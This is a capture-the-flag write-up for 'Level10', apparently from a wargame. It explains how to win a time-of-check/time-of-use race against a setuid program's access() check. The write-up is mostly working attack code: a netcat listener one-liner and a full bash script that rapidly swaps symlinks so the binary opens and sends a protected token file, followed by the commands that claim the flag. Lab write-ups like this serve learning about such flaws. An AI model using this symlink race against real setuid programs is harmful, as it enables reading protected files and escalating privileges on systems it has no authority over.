# Level10

In orther to get the flag from `level10` program we need two things: a server listening on port 6969 and a script to exploit `access` function flaws.
Let's get a netcat server running.
>`while true;  do nc -l 6969 | grep -v '.*( )*.' ; done`


Our script will create a `random_file` and a `link`. Two loops will create symlinks: one linking the `random_file` to the `link`, and the other linking the `token` file to the `link`. This rapid replacement will exploit the access policy, allowing us to open the `token` file using the `level10` program.
```bash
#!/bin/bash

random_file=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)

touch /tmp/$random_file

link_name=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)

while true
do
        /home/user/level10/level10 /tmp/$link_name 127.0.1 &> /dev/null
done &

while true
do
        ln -fs /home/user/level10/token /tmp/$link_name
        ln -fs /tmp/$random_file /tmp/$link_name
done
```

Get the flag.
>`su flag10`

>`getflag`
